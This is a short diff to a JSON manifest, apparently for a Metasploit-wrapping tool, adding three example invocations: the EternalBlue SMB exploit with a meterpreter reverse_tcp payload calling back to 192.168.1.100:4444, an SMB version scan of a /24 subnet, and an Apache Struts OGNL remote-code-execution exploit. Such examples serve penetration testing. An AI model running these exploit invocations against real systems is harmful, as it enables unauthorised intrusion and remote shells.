@@ -83,5 +83,10 @@
     "icon": "terminal",
     "color": "red"
   },
+  "examples": [
+    {"description": "Exploit EternalBlue", "args": {"module": "exploit/windows/smb/ms17_010_eternalblue", "target": "192.168.1.10", "payload": "windows/x64/meterpreter/reverse_tcp", "lhost": "192.168.1.100", "lport": "4444"}},
+    {"description": "Run SMB version scanner", "args": {"module": "auxiliary/scanner/smb/smb_version", "target": "192.168.1.0/24"}},
+    {"description": "Exploit Apache Struts RCE", "args": {"module": "exploit/multi/http/struts2_content_type_ognl", "target": "192.168.1.10", "rport": "8080", "lhost": "192.168.1.100"}}
+  ],
   "signature": "454fbdc421798eeaef98872c36d0d67add145a2eb5bed1339cf053be9c8d0c5adb4d905a3076f59ad585d86fc3fa840965b3b05f3d070437e23a3e4a2cb02e04"
 }
